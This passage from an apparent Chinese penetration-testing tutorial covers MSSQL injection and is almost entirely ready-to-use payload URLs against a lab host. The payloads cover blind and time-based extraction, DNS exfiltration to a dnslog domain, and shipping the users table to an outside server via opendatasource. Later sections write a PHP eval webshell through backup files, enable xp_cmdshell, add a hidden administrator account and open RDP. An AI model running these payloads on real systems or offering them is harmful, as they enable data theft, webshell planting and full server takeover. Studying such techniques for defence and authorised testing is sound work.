<h3 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(select top 1 username from users)		#获取第1个数据</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and 1=(select top 1 username from users where username &lt;&gt; &#x27;admin&#x27;) #获取username不为&#x27;admin&#x27;的数据（第2个数据）</span><br></pre></td></tr></table></figure>
<h2 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h2><h3 id="判断数据库的数量"><a href="#判断数据库的数量" class="headerlink" title="判断数据库的数量"></a>判断数据库的数量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select count(*) from master..sysdatabases)&gt;7 	#判断数据库数量（包括4个系统数据库）</span><br></pre></td></tr></table></figure>
<h3 id="判断数据库长度"><a href="#判断数据库长度" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and len(db_name())&gt;3			#判断当前数据库的长度</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and len(db_name(1))&gt;3		#判断第1个数据库的长度</span><br></pre></td></tr></table></figure>
<h3 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and ascii(substring((select db_name()),1,1))&gt;100 	#若回显正常说明当前数据库第1个字符的ASCII码值大于100</span><br></pre></td></tr></table></figure>
<h3 id="判断数据库中表的数量"><a href="#判断数据库中表的数量" class="headerlink" title="判断数据库中表的数量"></a>判断数据库中表的数量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select count(*) from test.sys.sysobjects where xtype=&#x27;U&#x27;)&gt;2</span><br></pre></td></tr></table></figure>
<h3 id="判断数据库中表的长度"><a href="#判断数据库中表的长度" class="headerlink" title="判断数据库中表的长度"></a>判断数据库中表的长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select top 1 len(name) from test..sysobjects where xtype=&#x27;U&#x27;)&gt;3		#判断第1张表的长度</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and (select top 1 len(name) from test..sysobjects where xtype=&#x27;U&#x27; and name not in (select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27;))&gt;3		#判断第2张表的长度</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and (select top 1 len(name) from test..sysobjects where xtype=&#x27;U&#x27; and name not in (select top 2 name from test.sys.sysobjects where xtype=&#x27;U&#x27;))&gt;3		#判断第3张表的长度</span><br></pre></td></tr></table></figure>
<h3 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select ascii(substring((select top 1 name from test..sysobjects where xtype=&#x27;U&#x27;),1,1)))&gt;100	#猜解第1张表的表名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and (select ascii(substring((select top 1 name from test..sysobjects where xtype=&#x27;U&#x27; and name not in (select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27;)),1,1)))&gt;100	#猜解第2张表的表名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and (select ascii(substring((select top 1 name from test..sysobjects where xtype=&#x27;U&#x27; and name not in (select top 2 name from test.sys.sysobjects where xtype=&#x27;U&#x27;)),1,1)))&gt;100	#猜解第3张表的表名</span><br></pre></td></tr></table></figure>
<h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select count(*) from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;))&gt;2	#判断users表的字段数量</span><br></pre></td></tr></table></figure>
<h3 id="判断字段的长度"><a href="#判断字段的长度" class="headerlink" title="判断字段的长度"></a>判断字段的长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select top 1 len(name) from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;))&gt;1	#判断users表的第1个字段的长度</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and (select top 1 len(name) from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)))&gt;1	#判断users表的第2个字段的长度</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and (select top 1 len(name) from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 2 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)))&gt;1	#判断users表的第3个字段的长度</span><br></pre></td></tr></table></figure>
<h3 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and ascii(substring((select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)),1,1))&gt;100	#猜解users表的第1个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and ascii(substring((select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;))),1,1))&gt;100	#猜解users表的第2个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and ascii(substring((select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 2 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;))),1,1))&gt;100	#猜解users表的第3个字段名</span><br></pre></td></tr></table></figure>
<h3 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and ascii(substring((select top 1 username from users),1,1))&gt;100	#猜解users表的username字段的值</span><br></pre></td></tr></table></figure>
<h2 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h2><p><code>WAITFOR</code>是SQL Server中Transact-SQL提供的⼀个流程控制语句。它的作⽤就是等待特定时间，然后继续执⾏后 续的语句。它包含⼀个参数<code>DELAY</code>，⽤来指定等待的时间。</p>
<p>如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有<code>延迟</code>，渗透测试⼈员就可以判断⽹站是否存在注⼊漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测⽅法。</p>
<p>时间型盲注payload在布尔型盲注的基础上进行改进，所以这里简单举几个例子。</p>
<h3 id="猜解数据库名-1"><a href="#猜解数据库名-1" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 if (ascii(substring((select db_name()),1,1))&gt;100) waitfor delay &#x27;0:0:3&#x27; 	#若延迟3秒以上，说明当前数据库第1个字符的ASCII码值大于100</span><br></pre></td></tr></table></figure>
<h3 id="猜解表名-1"><a href="#猜解表名-1" class="headerlink" title="猜解表名"></a>猜解表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 if ((select ascii(substring((select top 1 name from test..sysobjects where xtype=&#x27;U&#x27;),1,1)))&gt;100) waitfor delay &#x27;0:0:3&#x27;		#判断users表的第1个字段的长度</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 if ((select top 1 len(name) from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)))&gt;1) waitfor delay &#x27;0:0:3&#x27;	#猜解第2张表的表名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 if ((select top 1 len(name) from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 2 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)))&gt;1) waitfor delay &#x27;0:0:3&#x27;	#猜解第3张表的表名</span><br></pre></td></tr></table></figure>
<h3 id="猜解字段名-1"><a href="#猜解字段名-1" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 if (ascii(substring((select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)),1,1))&gt;100) waitfor delay &#x27;0:0:3&#x27;		#猜解users表的第1个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 if (ascii(substring((select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;))),1,1))&gt;100) waitfor delay &#x27;0:0:3&#x27;		#猜解users表的第2个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 if (ascii(substring((select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 2 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;))),1,1))&gt;100) waitfor delay &#x27;0:0:3&#x27;		#猜解users表的第2个字段名</span><br></pre></td></tr></table></figure>
<h3 id="猜解数据-1"><a href="#猜解数据-1" class="headerlink" title="猜解数据"></a>猜解数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 if (ascii(substring((select top 1 username from users),1,1))&gt;100) waitfor delay &#x27;0:0:3&#x27;	#猜解users表的username字段的值</span><br></pre></td></tr></table></figure>
<h2 id="DNS带外通信注入"><a href="#DNS带外通信注入" class="headerlink" title="DNS带外通信注入"></a>DNS带外通信注入</h2><p>关于带外通信注入的知识点在MySQL数据库注入中讲到过，这里就直接上payload了。</p>
<h3 id="获取数据库名-2"><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2buser%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a		#获取用户名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2bdb_name()%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a  #获取当前数据库名</span><br></pre></td></tr></table></figure>
<h3 id="获取表名-2"><a href="#获取表名-2" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2b(select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27;)%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a		#获取当前表名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2b(select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27; and name not in (select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27;))%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a			#获取第2张表名</span><br></pre></td></tr></table></figure>
<h3 id="获取字段名-2"><a href="#获取字段名-2" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2b(select top 1 name from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;))%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a	#获取users表的第1个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2b(select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)))%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a	#获取users表的第1个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2b(select top 1 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;) and name not in (select top 2 name from test..syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)))%2b&#x27;.bp1itz.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a	#获取users表的第3个字段名</span><br></pre></td></tr></table></figure>
<h3 id="获取数据-2"><a href="#获取数据-2" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;declare @a char(128);set @a=&#x27;\\&#x27;%2brtrim(cast((select top 1 username from users)as varchar))%2b&#x27;.o9i6yq.dnslog.cn\abc&#x27;;exec master..xp_dirtree @a	#rtrim()函数作用为去除字符串右边的空格；cast()函数的作用为将查询到的数据转换为相应的类型</span><br></pre></td></tr></table></figure>
<h2 id="反弹注入"><a href="#反弹注入" class="headerlink" title="反弹注入"></a>反弹注入</h2><p>有时候，明明是sql注入的点，却无法进行注入，注射工具拆解的速度异常的缓慢，错误提示信息关闭，无法返回注入的结果，这个时候你便可以尝试使用反弹注入。</p>
<p>反弹注入需要依赖于函数<code>opendatasource()</code>的支持，将当前数据库中的查询结果发送到另一数据库服务器中。</p>
<p>注：<code>openrowset()函数也可实现</code></p>
<p>MSSQL<strong>反弹注入语句解析</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into</span><br><span class="line">opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5009.webweb.com,1433;uid=DB_14A5E44_zkaq_admin;pwd=zkaqzkaq;database=DB_14A5E44_zkaq&#x27;).DB_14A5E44_zkaq.dbo.temp</span><br><span class="line">select * from admin –</span><br><span class="line"></span><br><span class="line">server=连接地址,端口;uid=用户名;pwd=密码;database=数据库名称</span><br></pre></td></tr></table></figure>
<p><strong>实验演示数据</strong>：</p>
<blockquote>
<p>连接服务器地址：192.168.123.120</p>
<p>连接数据库名：test_inject</p>
<p>连接数据库用户名：sa</p>
<p>连接数据库密码：Hacker1961</p>
<p>创建一个4个字段的表：test_table</p>
<p>注：在实际渗透过程中切勿使用sa用户进行反弹注入，并且使用云主机的数据库连接，这里只是作为演示。</p>
</blockquote>
<p>如果在使用反弹注入的过程中报错：<code>SQL Server 阻止了对组件 &#39;Ad Hoc Distributed Queries&#39; 的 STATEMENT&#39;OpenRowset/OpenDatasource&#39; 的访问</code>,则需要开启Ad Hoc Distributed Queries组件，执行语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">reconfigure</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1</span><br><span class="line">reconfigure</span><br></pre></td></tr></table></figure>
<h3 id="获取数据库名-3"><a href="#获取数据库名-3" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=192.168.123.120,1433;uid=sa;pwd=Hacker1961;database=test_inject&#x27;).test_inject.dbo.test_table select name,null,null,null from master.dbo.sysdatabases		#获取所有数据库名</span><br></pre></td></tr></table></figure>
<p>查看连接数据库</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061052597.png" alt="70bb15cdc04788f8a7f933d59b34ab0d.png"></p>
<h3 id="获取表名-3"><a href="#获取表名-3" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=192.168.123.120,1433;uid=sa;pwd=Hacker1961;database=test_inject&#x27;).test_inject.dbo.test_table select null,name,null,null from test.sys.sysobjects where xtype=&#x27;U&#x27;	#获取test数据库的所有表名</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061050778.png" alt="546032b90c724469e04d387ffabafabb.png"></p>
<h3 id="获取字段名-3"><a href="#获取字段名-3" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=192.168.123.120,1433;uid=sa;pwd=Hacker1961;database=test_inject&#x27;).test_inject.dbo.test_table select null,null,name,null from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;)	#获取users表中的所有列名</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061051335.png" alt="c021a769ae8ddc5df5eb95b078a57ddc.png"></p>
<h3 id="获取数据-3"><a href="#获取数据-3" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=192.168.123.120,1433;uid=sa;pwd=Hacker1961;database=test_inject&#x27;).test_inject.dbo.test_table select username,password,null,null from users		#获取users表中的所有数据</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061052589.png" alt="c315e3af7df738724c85f1456302ea96.png"></p>
<h2 id="DB-owner权限写WebShell"><a href="#DB-owner权限写WebShell" class="headerlink" title="DB_owner权限写WebShell"></a>DB_owner权限写WebShell</h2><p>无论是LOG备份还是差异备份，都是利用备份的过程中写入一句话木马。</p>
<h3 id="判断是否拥有db-owner权限"><a href="#判断是否拥有db-owner权限" class="headerlink" title="判断是否拥有db_owner权限"></a>判断是否拥有db_owner权限</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(select is_member(&#x27;db_owner&#x27;))	#若返回正常数据，则拥有db_owner权限</span><br></pre></td></tr></table></figure>
<h3 id="利用xp-dirtree查找物理目录"><a href="#利用xp-dirtree查找物理目录" class="headerlink" title="利用xp_dirtree查找物理目录"></a>利用xp_dirtree查找物理目录</h3><p>如果我们用DB权限写入一句话是需要知道web目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),id int not null identity(1,1))			#创建一张临时表</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;insert into temp(dir,depth,files) exec master.dbo.xp_dirtree &#x27;c:&#x27;,1,1 	#利用xp_dirtree 查询，将指定目录文件和文件夹插入到临时表中，这里查询的是C盘目录</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061051967.png" alt="ba6e0aa3cd637aebe0d6cbd888589500.png"></p>
<p>可以通过sql注入，查找temp表下的dir字段的值即可得到c盘下的文件与文件夹</p>
<p>可以通过此方式，查询Web根目录</p>
<blockquote>
<p>注：</p>
<p>execute master..xp_dirtree ‘c:’ —列出所有c:\文件、目录、子目录</p>
<p>execute master..xp_dirtree ‘c:’,1 —只列c:\目录</p>
<p>execute master..xp_dirtree ‘c:’,1,1 —列c:\目录、文件</p>
</blockquote>
<p><strong>SQLServer常见的备份策略</strong></p>
<ul>
<li>每周一次完整备份</li>
<li>每天一次差异备份</li>
<li>每小时一次事务日志备份</li>
</ul>
<h3 id="LOG备份写入WebShell"><a href="#LOG备份写入WebShell" class="headerlink" title="LOG备份写入WebShell"></a>LOG备份写入WebShell</h3><p><strong>利用前提</strong>：</p>
<ul>
<li>目标机器存在数据库备份文件 ，也就是如果我们利用 test 数据库的话，则需要该test数据库存在数据库备份文件，而且恢复模式得是 完整模式</li>
<li>知道网站的绝对路径</li>
<li>该注入支持堆叠注入</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;alter database test set RECOVERY FULL	#修改数据库恢复模式为 完整模式</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;create table cmd (a image)				#创建一张表cmd，只有一个列 a，类型为image</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;backup log test to disk= &#x27;C:\Wamp\apache2.4\htdocs\WWW\1.php&#x27; with init		#备份表到指定路径</span><br><span class="line"></span><br><span class="line">    http://hackrock.com:8205/?id=1;insert into cmd (a) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e)	#插入一句话到cmd表里，其中0x3c3f70687020406576616c28245f504f53545b785d293b3f3e 是一句话木马 &lt;?php @eval($_POST[x]);?&gt; 的16进制表示</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;backup log test to disk= &#x27;C:\Wamp\apache2.4\htdocs\WWW\2.php&#x27;		#把操作日志备份到指定文件</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;drop table cmd;			#删除cmd表</span><br></pre></td></tr></table></figure>
<p>执行完成后会在目标网站根目录下生成1.php和2.php文件，其中1.php 保存数据库，2.php就是我们需要连接的木马文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061051656.png" alt="91472d32967d1548756fa36a60424fcc.png"></p>
<h3 id="差异备份写入WebShell"><a href="#差异备份写入WebShell" class="headerlink" title="差异备份写入WebShell"></a>差异备份写入WebShell</h3><p>注：差异备份有概率会把网站搞崩，所以不建议使用差异备份</p>
<p><strong>利用前提</strong>：</p>
<ul>
<li>知道网站的绝对路径</li>
<li>该注入支持堆叠注入</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;backup database test to disk=&#x27;C:\temp\tmp.bak&#x27;</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;create table [dbo].[test_tmp] ([cmd] [image])</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;insert into [test_tmp](cmd) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e)</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;backup database test to disk=&#x27;C:\Wamp\apache2.4\htdocs\WWW\shell.php&#x27; with differential,format</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061051758.png" alt="65ed0b9a7780f4d0fb89684122fb0a6e.png"></p>
<h2 id="SA权限执行系统命令"><a href="#SA权限执行系统命令" class="headerlink" title="SA权限执行系统命令"></a>SA权限执行系统命令</h2><h3 id="MSSQL扩展存储过程"><a href="#MSSQL扩展存储过程" class="headerlink" title="MSSQL扩展存储过程"></a>MSSQL扩展存储过程</h3><p>扩展存储过程是MSSQL提供的特殊功能。所谓“扩展存储过程”其实就是一个普通的Windows系统DLL文件，按照某种规则实现了某些函数功能，MSSQL利用扩展存储可以实现许多强大的功能，包括对系统进行操作，利用这个特性，在实施MSSQL注入攻击时，可以更容易地对系统进行控制。</p>
<blockquote>
<p><strong>攻击中最常利用的扩展存储</strong></p>
<p>xp_cmdshell ——可以直接执行系统命令</p>
<p>sp_oacreate ——可以执行系统命令</p>
<p>xp_regread ——可以进行注册表读取</p>
<p>xp_regwrite ——可以写入注册表</p>
<p>xp_regdeletevalue ——删除注册表值</p>
<p>xp_dirtree ——可以进行列目录操作</p>
<p>xp_password ——更改密码</p>
<p>xp_servicecontrol ——停止或激活某服务</p>
<p>sp_addlogin ——创建新的SQLServer登录</p>
<p>sp_dropuser ——从当前数据库中删除数据库用户</p>
<p>sp_enumgroups ——提供本地组列表或在指定的域中定义全局组列表</p>
<p>xp_enumds ——可以进行ODBC连接</p>
<p>xp_loginconfig ——可以配置服务器安全模式信息</p>
<p>xp_makecab ——可以创建压缩卷</p>
<p>xp_ntsec_enumdomains ——可以查看domain信息</p>
<p>xp_terminate_jroces ——可以查看终端进程，给出一个进程PID</p>
</blockquote>
<h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p>xp_cmdshell这个存储过程可以用来执行cmd命令。</p>
<h4 id="查看扩展是否存在"><a href="#查看扩展是否存在" class="headerlink" title="查看扩展是否存在"></a>查看扩展是否存在</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype=&#x27;X&#x27; and name=&#x27;xp_cmdshell&#x27;) 		#若正常显示，则xp_cmdshell扩展已存在</span><br></pre></td></tr></table></figure>
<h4 id="开启扩展"><a href="#开启扩展" class="headerlink" title="开启扩展"></a>开启扩展</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1;execute(&#x27;sp_configure &quot;show advanced options&quot;,1&#x27;)  #将该选项的值设置为1</span><br><span class="line">http://hackrock.com:8205/?id=1;execute(&#x27;reconfigure&#x27;)                             #保存设置</span><br><span class="line">http://hackrock.com:8205/?id=1;execute(&#x27;sp_configure &quot;xp_cmdshell&quot;, 1&#x27;)           #将xp_cmdshell的值设置为1</span><br><span class="line">http://hackrock.com:8205/?id=1;execute(&#x27;reconfigure&#x27;)                             #保存设置</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1;exec sp_configure &#x27;show advanced options&#x27;,1;       </span><br><span class="line">http://hackrock.com:8205/?id=1;reconfigure;                                       </span><br><span class="line">http://hackrock.com:8205/?id=1;exec sp_configure &#x27;xp_cmdshell&#x27;,1;                 </span><br><span class="line">http://hackrock.com:8205/?id=1;reconfigure;                                      </span><br></pre></td></tr></table></figure>
<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">添加用户</span><br><span class="line">http://hackrock.com:8205/?id=1;exec xp_cmdshell &#x27;net user hacker$ Admin12345 /add&#x27;</span><br><span class="line">http://hackrock.com:8205/?id=1;exec xp_cmdshell &#x27;net localgroup administrators hacker$ /add&#x27;</span><br><span class="line"></span><br><span class="line">开启远程桌面</span><br><span class="line">http://hackrock.com:8205/?id=1;exec xp_cmdshell &#x27;reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t reg_dword /d 0 /f&#x27;;exec xp_cmdshell &#x27;reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot; /v PortNumber /t reg_dword /d 3389 /f&#x27;;exec xp_cmdshell &#x27;reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t reg_dword /d 3389 /f&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><p>使用sp_oacreate提权前提条件：</p>
<ul>
<li>SQLServer数据库服务未降权 （因为需要调用COM组件）</li>
</ul>
<p>我们可以借助SQLServer中的COM组件sp_oacreate来执行系统命令，使用下面命令查看是否可使用 sp_oacreate 执行系统命令。</p>
<h4 id="查看扩展是否存在-1"><a href="#查看扩展是否存在-1" class="headerlink" title="查看扩展是否存在"></a>查看扩展是否存在</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype=&#x27;X&#x27; and name=&#x27;sp_oacreate&#x27;) 		#若正常显示，则sp_oacreate扩展已存在</span><br></pre></td></tr></table></figure>
